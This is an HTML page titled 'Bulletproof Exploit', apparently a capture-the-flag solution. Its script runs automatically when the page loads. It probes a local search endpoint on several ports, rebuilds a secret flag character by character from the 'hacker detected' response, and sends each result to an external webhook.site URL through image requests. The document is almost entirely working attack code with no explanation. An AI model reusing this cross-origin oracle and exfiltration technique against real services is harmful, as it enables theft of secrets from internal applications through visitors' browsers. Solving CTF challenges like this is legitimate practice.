<!DOCTYPE html>
<html>
<head>
    <title>Bulletproof Exploit</title>
</head>
<body>
    <h1>Extracting Flag...</h1>
    <div id="output"></div>
    
    <script>
        // Webhook
        const WEBHOOK = '	https://webhook.site/11e453b1-e116-4947-9501-3016aceedae5';
        const charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_{}-!';
        let flag = 'BOH25{';
        
        function log(msg) {
            console.log(msg);
            document.getElementById('output').innerHTML += msg + '<br>';
        }
        
        // Exfiltration using image tag (most reliable, bypasses CORS)
        function exfil(key, value) {
            const url = WEBHOOK + '?' + key + '=' + encodeURIComponent(value) + '&t=' + Date.now();
            const img = new Image();
            img.src = url;
            log('Exfil: ' + key + '=' + value);
        }
        
        // Try multiple ports
        async function checkQuery(query) {
            const ports = [5000, 3005, 80];
            for (const port of ports) {
                try {
                    const url = `http://127.0.0.1:${port}/search?q=${encodeURIComponent(query)}`;
                    const res = await fetch(url, {method: 'GET'});
                    const text = await res.text();
                    const detected = text.includes('hacker detected');
                    exfil('check', query + '|port' + port + '|' + (detected ? 'YES' : 'NO'));
                    return detected;
                } catch (e) {
                    exfil('error', query + '|port' + port + '|' + e.message);
                    continue;
                }
            }
            return false;
        }
        
        async function extract() {
            exfil('start', flag);
            log('Starting extraction...');
            
            while (flag.length < 100 && !flag.endsWith('}')) {
                log('Position: ' + flag.length);
                let found = false;
                
                for (let c of charset) {
                    const test = flag + c;
                    const detected = await checkQuery(test);
                    
                    if (detected) {
                        const verify = test + 'ZZZ_NOT_IN_FLAG_999';
                        const verifyDetected = await checkQuery(verify);
                        
                        if (!verifyDetected) {
                            flag += c;
                            found = true;
                            log('FOUND: ' + c + ' -> ' + flag);
                            exfil('flag', flag);
                            exfil('found', c);
                            
                            if (c === '}') {
                                log('COMPLETE: ' + flag);
                                for (let i = 0; i < 20; i++) {
                                    exfil('FINAL', flag);
                                    exfil('COMPLETE', flag);
                                    await new Promise(r => setTimeout(r, 100));
                                }
                                return;
                            }
                            break;
                        }
                    }
                    await new Promise(r => setTimeout(r, 50));
                }
                
                if (!found) {
                    log('STUCK at: ' + flag);
                    exfil('stuck', flag);
                    break;
                }
                await new Promise(r => setTimeout(r, 100));
            }
            
            exfil('done', flag);
            log('Done: ' + flag);
        }
        
        // Start after delay to ensure page loaded
        setTimeout(extract, 500);
    </script>
</body>
</html>

